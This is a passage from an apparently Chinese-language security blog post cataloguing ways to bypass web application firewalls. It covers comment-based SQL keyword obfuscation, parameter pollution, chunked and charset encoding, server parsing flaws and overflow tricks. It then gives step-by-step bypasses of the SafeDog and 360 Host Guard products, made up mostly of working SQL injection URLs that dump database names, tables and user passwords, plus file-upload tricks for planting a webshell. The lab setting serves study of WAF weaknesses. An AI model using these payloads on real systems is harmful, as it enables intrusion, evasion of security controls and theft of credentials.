+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User() = <span class="regexp">/*!user/</span>*<span class="number">123</span>*<span class="regexp">/()*/</span>   <span class="regexp">//</span>  <span class="regexp">/*!*/</span>内部继续执行</span><br><span class="line">Union select = <span class="regexp">/*!union*/</span><span class="regexp">/*123*/</span><span class="regexp">/*!select*/</span>   <span class="regexp">//</span>组合</span><br></pre></td></tr></table></figure>
+
+<p>%0a换行与#单行注释符配合使用。</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Union</span> select = <span class="built_in">union</span><span class="meta">#A%0aselect <span class="comment">//用#注释，再用%0a逃出注释继续执行后面语句</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="配合过滤代码或漏洞本身"><a href="#配合过滤代码或漏洞本身" class="headerlink" title="配合过滤代码或漏洞本身"></a><strong>配合过滤代码或漏洞本身</strong></h4><p>关键字被过滤，双写关键字。</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">and</span> <span class="operator">=</span> anandd      //将关键字过滤掉后剩下的内容组成新的关键字</span><br></pre></td></tr></table></figure>
+
+<p>通过chr()函数变换关键字。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">phpinfo</span><span class="params">()</span></span> = chr (<span class="number">80</span>)<span class="selector-class">.chr</span> (<span class="number">72</span>)<span class="selector-class">.chr</span> (<span class="number">80</span>)<span class="selector-class">.chr</span> (<span class="number">73</span>)<span class="selector-class">.chr</span> (<span class="number">78</span>)<span class="selector-class">.chr</span> (<span class="number">70</span>)<span class="selector-class">.chr</span> (<span class="number">79</span>)<span class="selector-class">.chr</span> (<span class="number">40</span>)<span class="selector-class">.chr</span> (<span class="number">41</span>)   <span class="comment">//将acsii码通过chr()函数转换回来</span></span><br></pre></td></tr></table></figure>
+
+<p>通过base_convert() 函数变换关键字。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">phpinfo</span> = base_convert(<span class="number">27440799224</span>,<span class="number">10</span>,<span class="number">32</span>)  //从<span class="number">10</span>进制转换成<span class="number">32</span>进制</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="http协议绕过"><a href="#http协议绕过" class="headerlink" title="http协议绕过"></a><strong>http协议绕过</strong></h3><p>原理：理解不了恶意语句就不会拦截。</p>
+<h4 id="Content-Type绕过"><a href="#Content-Type绕过" class="headerlink" title="Content-Type绕过"></a><strong>Content-Type绕过</strong></h4><p>有的waf 识别到Content-Type类型为multipart&#x2F;form-data后，会将它认为是文件上传请求，从而不检测其他种类攻击只检测文件上传，导致被绕过。</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">application/x-www-<span class="keyword">form</span>-urlencoded è multipart/<span class="keyword">form</span>-<span class="keyword">data</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="HTTP请求方式绕过"><a href="#HTTP请求方式绕过" class="headerlink" title="HTTP请求方式绕过"></a><strong>HTTP请求方式绕过</strong></h4><p>waf在对危险字符进行检测的时候，分别为post请求和get请求设定了不同的匹配规则，请求被拦截，变换请求方式有几率能绕过检测。</p>
+<p><strong>Ps:云锁&#x2F;安全狗安装后默认状态对post请求检测力度较小，可通过变换请求方式绕过。</strong></p>
+<h4 id="参数污染绕过"><a href="#参数污染绕过" class="headerlink" title="参数污染绕过"></a><strong>参数污染绕过</strong></h4><p>由于http协议允许同名参数的存在，同时waf的处理机制对同名参数的处理方式不同，造成“参数污染”。不同的服务器搭配会对传递的参数解析出不同的值。配合waf与中间件对参数解析位置不同，可能绕过waf。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">提交的参数为：?<span class="attribute">id</span>=1&amp;id=2&amp;id=exp</span><br><span class="line">asp.net+iis:<span class="attribute">id</span>=1,2,exp</span><br><span class="line">asp+iis:<span class="attribute">id</span>=1,2,exp</span><br><span class="line">php+apache:<span class="attribute">id</span>=exp</span><br></pre></td></tr></table></figure>
+
+<p><strong>部分中间件的处理方法：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">Web 环境</th>
+<th align="left">参数获取函数</th>
+<th align="left">获取到的参数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">PHP&#x2F;Apache</td>
+<td align="left">$_GET(“par”)</td>
+<td align="left">last</td>
+</tr>
+<tr>
+<td align="left">JSP&#x2F;Tomcat</td>
+<td align="left">Request.getParameter(“par”)</td>
+<td align="left">first</td>
+</tr>
+<tr>
+<td align="left">Perl(CGI)&#x2F;Apache</td>
+<td align="left">Param(“par”)</td>
+<td align="left">first</td>
+</tr>
+<tr>
+<td align="left">Python&#x2F;Apache</td>
+<td align="left">getvalue(“par”)</td>
+<td align="left">[“first”,”last”]</td>
+</tr>
+<tr>
+<td align="left">ASP.NET&#x2F;IIS</td>
+<td align="left">Request.QueryString(“par”)</td>
+<td align="left">first,last</td>
+</tr>
+</tbody></table>
+<h4 id="解析特性绕过"><a href="#解析特性绕过" class="headerlink" title="解析特性绕过"></a><strong>解析特性绕过</strong></h4><p>原理：利用waf与后端服务器的解析不一致。</p>
+<p>Iis5.0-6.0解析漏洞</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">.asp</span> --&gt; <span class="string">/xx.asp/xx.jpg</span>  <span class="string">//.asp</span>，<span class="string">.asa</span>目录下的文件都解析成asp文件</span><br><span class="line"><span class="string">.asp</span> --&gt; xx.asp;<span class="string">.jpg</span>     <span class="string">//</span>服务器默认不解析;号后面的内容</span><br></pre></td></tr></table></figure>
+
+<p>Iis7.5解析漏洞(php.ini开启fix_pathinfo)</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">.php</span> --&gt; <span class="string">/xx.jpg</span>         <span class="string">//</span>上传<span class="string">.jpg</span>一句话，访问时后面加上<span class="string">/xx.php</span> </span><br></pre></td></tr></table></figure>
+
+<p>apache解析漏洞</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.php</span> --&gt; /test<span class="selector-class">.php</span><span class="selector-class">.php123</span>     <span class="comment">//从右往左，能别的后缀开始解析</span></span><br></pre></td></tr></table></figure>
+
+<p>nginx解析漏洞(php.ini开启fix_pathinfo)</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="function"><span class="title">php</span> --&gt;</span> xxx.jpg%<span class="number">00</span>.php      <span class="comment">//Nginx &lt;8.03 空字节代码执行漏洞</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="多Content-Disposition绕过"><a href="#多Content-Disposition绕过" class="headerlink" title="多Content-Disposition绕过"></a><strong>多Content-Disposition绕过</strong></h4><p>请求包中包含多个Content-Disposition时，中间件与waf取值不同。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051735.png" alt="图片"></p>
+<h4 id="解析兼容性绕过"><a href="#解析兼容性绕过" class="headerlink" title="解析兼容性绕过"></a><strong>解析兼容性绕过</strong></h4><p>在http协议中，标准的文件名的形式为filename&#x3D;”1.php”,但是web容器会在解析协议时做一些兼容，文件上传时，有的waf只按照标准协议去解析，解析不到文件名，从而被绕过。</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">filename=&quot;test.php</span>  <span class="attr">filename=test.php</span>  <span class="attr">filename=‘test.php‘</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="keep-alive（Pipeline）绕过"><a href="#keep-alive（Pipeline）绕过" class="headerlink" title="keep-alive（Pipeline）绕过"></a><strong>keep-alive（Pipeline）绕过</strong></h4><p>原理:http请求头部中有Connection这个字段，建立的tcp连接会根据此字段的值来判断是否断开，我们可以手动将此值置为keep-alive，然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051933.png" alt="图片"></p>
+<p>发送两个请求，但绕过失败，被云锁拦截，此种方法现在基本失效。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051105.png" alt="图片"></p>
+<h4 id="分块传输绕过"><a href="#分块传输绕过" class="headerlink" title="分块传输绕过"></a><strong>分块传输绕过</strong></h4><p>原理:分块编码传输将关键字and,or,select ,union等关键字拆开编码，<strong>绕过waf等安全设备的检测，但无法绕过代码本身的检测。</strong></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051050.png" alt="图片"></p>
+<h4 id="修改编码方式：Charset绕过"><a href="#修改编码方式：Charset绕过" class="headerlink" title="修改编码方式：Charset绕过"></a><strong>修改编码方式：Charset绕过</strong></h4><p>原理:大部分的WAF默认用UTF8编码检测，修改编码方式可能会绕过waf，例如设置charset为ibm037。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051186.png" alt="图片"></p>
+<h4 id="HTTP协议未覆盖"><a href="#HTTP协议未覆盖" class="headerlink" title="HTTP协议未覆盖"></a>HTTP协议未覆盖</h4><p>  Content-type: multipart&#x2F;form-date 为什么存在？是为了满足能够既传参数又能传文件的场景；</p>
+<p>①利用 Content-type: multipart&#x2F;form-date 绕过上传的边界（boundary）限制。</p>
+<p>通过多boundary定义，使waf检测范围和实际上传范围不一致，从而绕过waf上传恶意内容：<img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271151858.png" alt="图片"></p>
+<p>②上传参数“file”,绕过waf检测“filename”</p>
+<h4 id="Chunked-协议未覆盖"><a href="#Chunked-协议未覆盖" class="headerlink" title="Chunked+协议未覆盖"></a><strong>Chunked+协议未覆盖</strong></h4><p>  利用 Content-type: multipart&#x2F;form-date + Chunked编码绕过WAF检测限制。</p>
+<h3 id="Waf检测限制绕过"><a href="#Waf检测限制绕过" class="headerlink" title="Waf检测限制绕过"></a><strong>Waf检测限制绕过</strong></h3><p>原理：超出waf检测能力部分不会拦截。</p>
+<h4 id="高并发"><a href="#高并发" class="headerlink" title="高并发"></a><strong>高并发</strong></h4><p>  使用自动化工具短时间内发送大量攻击数据包。</p>
+<p>  <strong>缺点：</strong>动静太大，容易被业务察觉并封禁；</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271152283.png" alt="图片"></p>
+<h4 id="参数溢出"><a href="#参数溢出" class="headerlink" title="参数溢出"></a><strong>参数溢出</strong></h4><p>原理:通过增加传递得参数数量，达到waf检测上限，超出的参数就可绕过waf了。可绕一些轻量级waf，如phpstudy自带waf。</p>
+<p>设置拦截关键字：</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051474.png" alt="图片"></p>
+<p>添加参数数量，成功绕过。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051646.png" alt="图片"></p>
+<h4 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a><strong>缓冲区溢出</strong></h4><p>原理:当服务器可以处理的数据量大于waf时，这种情况可以通过发送大量的垃圾数据将 WAF 溢出，从而绕过waf。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">UnIoN</span> SeLeCT = and (select <span class="number">1</span>)=(Select <span class="number">0</span>xA*<span class="number">99999</span>) UnIoN SeLeCT  </span><br><span class="line"><span class="attribute">and</span> <span class="number">1</span>=<span class="number">1</span> = and <span class="number">1</span>=<span class="number">1</span> and <span class="number">99</span>…<span class="number">99999</span>   //此处省略N多个<span class="number">9</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="网络结构绕过"><a href="#网络结构绕过" class="headerlink" title="网络结构绕过"></a><strong>网络结构绕过</strong></h3><p>原理：不经过安全设备就不会拦截。</p>
+<h4 id="源ip绕过"><a href="#源ip绕过" class="headerlink" title="源ip绕过"></a><strong>源ip绕过</strong></h4><p>原理：直接对源地址发起攻击，流量不会经过waf，从而成功绕过。</p>
+<p>正常访问流量</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051701.png" alt="图片"></p>
+<p>攻击者流量</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051840.png" alt="图片"></p>
+<h4 id="同网段-x2F-ssrf绕过"><a href="#同网段-x2F-ssrf绕过" class="headerlink" title="同网段&#x2F;ssrf绕过"></a><strong>同网段&#x2F;ssrf绕过</strong></h4><p>同理, 因同网段的流量属于局域网，可能不经过waf的检测。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051910.png" alt="图片"></p>
+<p>通过服务器A自身或B的ssrf漏洞，从网络内部发起攻击流量。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051012.png" alt="图片"></p>
+<h2 id="一些waf绕过实例"><a href="#一些waf绕过实例" class="headerlink" title="一些waf绕过实例"></a>一些waf绕过实例</h2><h3 id="安全狗"><a href="#安全狗" class="headerlink" title="安全狗"></a>安全狗</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>用sql-lib演示</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查库：<span class="keyword">select</span> <span class="built_in">schema_name</span> <span class="keyword">from</span> information_schema.schemata</span><br><span class="line">查表：<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span></span><br><span class="line">查字段：<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;users&#x27;</span></span><br><span class="line">查字段的值：<span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">security</span>.users</span><br></pre></td></tr></table></figure>
+
+
+
+<p>万能符号：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select --&gt; union<span class="regexp">/*/</span><span class="regexp">/--/</span>*/select</span><br><span class="line">union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>--&gt;union <span class="regexp">/*!--+/</span>*%<span class="number">0</span>aselect<span class="regexp">/*!1,2,*/</span> <span class="number">3</span></span><br><span class="line">%<span class="number">20</span><span class="regexp">/*/</span><span class="regexp">/--/</span>*/</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h5><p>这边主要依赖<code>%20/*//--/*/</code></p>
+<p>拦截</p>
+<p><code>http://192.168.1.102/sql/Less-1/?id=1&#39; order by 1 --+ &#39;</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271158629.png" alt="image-20220327115845529"></p>
+<p><code>http://192.168.1.102/sql/Less-1/?id=1&#39; order /*//--/*/ by 1 --+</code> 成功</p>
+<p><code>http://192.168.1.102/sql/Less-1/?id=1&#39; order/*////*/by+3-- +</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271201184.png" alt="image-20220327120108096"></p>
+<p>也就是</p>
+<p>执行了</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271209310.png" alt="image-20220327120925238"></p>
+<h5 id="union-select语句"><a href="#union-select语句" class="headerlink" title="union select语句"></a>union select语句</h5><p><code>http://192.168.1.102/sql/Less-1/?id=1&#39; union /*//--/*/ select 1,2, 3 --+</code> </p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271210928.png" alt="image-20220327121041832"></p>
+<p>或者</p>
+<p><code>http://192.168.1.102/sql/Less-1/?id=1&#39; union /*//--/*/   /*!--+/*%0aselect/*!1,2,3*/ --+</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271211747.png" alt="image-20220327121127639"></p>
+<h5 id="database-关键字"><a href="#database-关键字" class="headerlink" title="database()关键字"></a>database()关键字</h5><p><code>http://192.168.1.102/sql/Less-1/?id=-1&#39; union /*//--/*/     /*!--+/*%0aselect/*!1,2,*/database /*//--/*/ ()  --+</code></p>
+<p><code>?id=-1&#39; union/*!90000zero*//*//*/select 1,user/*!90000zero*//*//*/(),database/*!90000zero*//*//*/()-- +</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271220405.png" alt="image-20220327121943984"></p>
+<h5 id="获取其他的库"><a href="#获取其他的库" class="headerlink" title="获取其他的库"></a>获取其他的库</h5><p><code>http://192.168.1.102/sql/Less-1/?id=-1&#39;   union   /*//--/*/ select 1,2, group_concat(schema_name)    /*!from*/    /*!--+/*%0ainformation_schema./*!schemata*/ --+</code></p>
+<p><code>http://192.168.1.102/sql/Less-1/?id=-1&#39;   union   /*!--+/*%0aselect/*!1,2,*/  group_concat(schema_name)    /*!from*/    /*!--+/*%0ainformation_schema./*!schemata*/ --+</code></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用<span class="regexp">/*!schemata*/</span> </span><br><span class="line">版本执行</span><br><span class="line">/*!<span class="number">06447</span><span class="comment">#</span></span><br><span class="line">from*/</span><br><span class="line"></span><br><span class="line">union <span class="regexp">/*!--+/</span>*</span><br><span class="line">select<span class="regexp">/*!1,2,*/</span><span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271221614.png" alt="image-20220327122138498"></p>
+<h5 id="其它步骤"><a href="#其它步骤" class="headerlink" title="其它步骤"></a>其它步骤</h5><p><code>http://192.168.1.102/sql/Less-1/?id=-1&#39;   union /*!--+/*%0aselect/*!1,2,*/  group_concat(table_name)    /*!from*/     /*!--+/*%0ainformation_schema./*!tables*/ where table_schema=&#39;security&#39; --+</code></p>
+<p><code>http://192.168.1.102/sql/Less-1/?id=-1&#39; union/*!90000zero*//*//*/select 1,user/*!90000zero*//*//*/(),group_concat(table_name) from --+/*%0ainformation_schema./*!tables*/ where table_schema=0x7365637572697479-- +</code></p>
+<p><code>http://192.168.1.102/sql/Less-1/?id=-1&#39;  union /*!--+/*%0aselect/*!1,2,*/  group_concat(column_name)    /*!from*/     /*!--+/*%0ainformation_schema./*!columns*/ where table_name=&#39;users&#39; --+</code></p>
+<p><code>http://192.168.1.102/sql/Less-1/?id=-1&#39; union*/\*!90000zero\*/**/\*//\*/*select 1,user*/\*!90000zero\*/**/\*//\*/*(),group_concat(column_name) from  *--+/\*%0ainformation_schema./\*!columns\*/ where table_name=0x7573657273-- +*</code></p>
+<p><code>http://192.168.1.102/sql/Less-1/?id=-1&#39;  union /*!--+/*%0aselect/*!1,2,*/  group_concat(concat_ws(0x7e,username, password))     /*!from*/    security.users --+</code></p>
+<p><code>http://192.168.1.102/sql/Less-1/?id=-1&#39; union*/\*!90000zero\*/**/\*//\*/*select 1,2,group_concat(username,0x7e,password) from*/\*//\*/*security.users*-- +*</code></p>
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h6 id="重复数据-多次参数重复"><a href="#重复数据-多次参数重复" class="headerlink" title="重复数据(多次参数重复)"></a>重复数据(多次参数重复)</h6><p>1.重复filename的值</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271522865.png" alt="图片"></p>
+<p>2.filename中配合配合Content-Disposition参数混淆</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271522614.png" alt="图片"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271522434.png" alt="图片"></p>
+<p>这个成功的原因应该还是安全狗之检测了第一个引号里的值，没有检测第二个导致的绕过。</p>
+<h6 id="数据溢出-防匹配-xxx…"><a href="#数据溢出-防匹配-xxx…" class="headerlink" title="数据溢出-防匹配(xxx…)"></a>数据溢出-防匹配(xxx…)</h6><p>我们的思路是这样的，你安全狗不是要检测吗，给你塞一堆乱七八糟的的垃圾数据，加大工作量，你是不是就不会检测了。这里我们参考上面的，哪些参数可以动，哪些参数最好不用动，在可以改动的参数中加垃圾数据。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271522368.png" alt="图片"></p>
+<p>这里成功上传，我这里是加了很多，加的少的话安全狗还是会检测到并拦截。</p>
+<h4 id="上传绕过-溢出"><a href="#上传绕过-溢出" class="headerlink" title="上传绕过-溢出"></a><strong>上传绕过-溢出</strong></h4><p>安全狗会对脚本文件的后缀和文件关键字进行正则处理并过滤有害请求。</p>
+<p>也就是说想绕过安全狗需要达到两点</p>
+<p>1、木马免杀<br>2、文件后缀绕过</p>
+<p>木马免杀很简单，php的话花样比较多，简单混淆一下即可</p>
+<p>如：</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524714.png" alt="img"></p>
+<p>但是后缀名就比较难了。如果对方web容器不支持畸形解析，那么后缀名必须上传脚本文件才可以getshell，因此最终到服务器的文件后缀名必须为php。而安全狗最基础的过滤便是过滤php后缀，那怎么解决呢。我们便可以使用http头的 <strong>Content-Disposition:</strong> 字段溢出。</p>
+<p>由于安全狗对于http头字段： Content-Disposition: 处理的不是很好， 当长度增加到48930的时候，安全狗的上传防御就失效了。结果如下图：</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524482.png" alt="img"></p>
+<p>这也就是溢出的基本思想，也就是将字段增加到程序无法处理的长度，然后溢出的长度便可以执行自己构造的代码。</p>
+<h4 id="上传绕过-换行符"><a href="#上传绕过-换行符" class="headerlink" title="上传绕过-换行符"></a><strong>上传绕过-换行符</strong></h4><p>这个其实我是在测试360主机卫士的时候想回来试一试的，没想到也可以绕过…</p>
+<p>具体怎么绕可以看一下下面的360上传绕过，这里就不多写了。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524333.png" alt="img"></p>
+<h3 id="360主机卫士"><a href="#360主机卫士" class="headerlink" title="360主机卫士"></a>360主机卫士</h3><p>虽然这款软件官网已经关闭，且不再更新，但是依然可以经常见到它的身影。</p>
+<p>环境：<br>phpstudy<br>360主机卫士Apache 纪念版<br>win 2008 r2</p>
+<p>代码没写，直接搬运的sqli-labs的源码</p>
+<p>简单测试：payload：?id&#x3D;-1 union select 1,2,3 –+</p>
+<p>sql攻击触发了防御机制，本来应该转到 zhuji.360.cn页面，正常来说是一个警告页。但是由于该软件已经停运，所以出现白屏即是被阻断。特征便是向zhuji.360.cn发出无回应的请求。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524782.png" alt="img"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524524.png" alt="img"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524892.png" alt="img"></p>
+<p>可见确确实实被防御了。</p>
+<p><strong>现在我们进行绕过</strong></p>
+<h4 id="SQL注入绕过-网站后台白名单绕过"><a href="#SQL注入绕过-网站后台白名单绕过" class="headerlink" title="SQL注入绕过-网站后台白名单绕过"></a>SQL注入绕过-网站后台白名单绕过</h4><p>在360主机卫士客户端设置中存在默认网站后台白名单，如图：</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524745.png" alt="img"></p>
+<p>利用PHP中的PATH_INFO问题，也就是将白名单关键字当作PATH_INFO 的模块绕过过滤 。</p>
+<p><strong>path_info 模式：<a target="_blank" rel="noopener" href="http://www.xxx.com/index.php">http://www.xxx.com/index.php</a> &#x2F; 模块 &#x2F; 方法：</strong></p>
+<p>随便挑选一个白名单加在后面，可成功bypass。</p>
+<p>如 ：index.php&#x2F;admin?id&#x3D;-1 union select 1,2,3 –+</p>
+<p>这里虽然路径有admin，但是这个admin会被当作是index.php的模块，最终访问的依然是index.php.</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524137.png" alt="img"></p>
+<h4 id="SQL注入绕过-静态资源绕过"><a href="#SQL注入绕过-静态资源绕过" class="headerlink" title="SQL注入绕过-静态资源绕过"></a>SQL注入绕过-静态资源绕过</h4><p>当文件后缀名为js、jpg、png等静态资源后缀请求，类似白名单机制，该waf为了检测效率，直接略过这样一些静态资源文件名后缀的请求。</p>
+<p>payload:index.php&#x2F;1.png?id&#x3D;-1 union select 1,2,3 –+</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524988.png" alt="img"></p>
+<h4 id="SQL注入绕过-溢出"><a href="#SQL注入绕过-溢出" class="headerlink" title="SQL注入绕过-溢出"></a>SQL注入绕过-溢出</h4><p>由于GET方式的请求是有长度限制的（这个限制不是HTTP协议限制的，而是不同的浏览器限制的，比如ie浏览器长度就限制为 <strong>2083 字节</strong> ），所以waf几乎都会对检测长度全覆盖，但是由于POST包长度不受限制（这里其实也有限制，是web容器对其的限制，比如Tomcat 默认是2MB ），所以相比GET，部分waf为了提高数据吞吐量和处理速度，对POST的数据过滤往往达不到全覆盖，当Post大包时，WAF在处理测试向量时超出了其缓冲区长度，超过检测内容长度将会直接Bypass，如果正常用户上传一些比较大的文件，WAF每个都检测的话，性能就会被耗光。所以可以使用溢出进行绕过。</p>
+<p>payload：id&#x3D;-1 and (select 1)&#x3D;(Select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) union select 1,2,3 – +</p>
+<p>也可以使用内联加入无效字符进行绕过，比如</p>
+<p>id&#x3D;-1 &#x2F;<em>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</em>&#x2F; union select 1,2,3 – +</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524905.png" alt="img"></p>
+<h4 id="SQL注入绕过-参数溢出"><a href="#SQL注入绕过-参数溢出" class="headerlink" title="SQL注入绕过-参数溢出"></a>SQL注入绕过-参数溢出</h4><p>这种溢出的形式，我称它为uri参数溢出。比如某WAF，默认情况下只能获取前100个参数进行检测，当提交第101个参数时，那么，将无法对攻击者提交的第100个以后的参数进行有效安全检测，从而绕过安全防御。</p>
+<p>经测试，当提交的参数个数超过97个，可进行union select 查询，再增加对关键字from的绕过，可成功Bypass。</p>
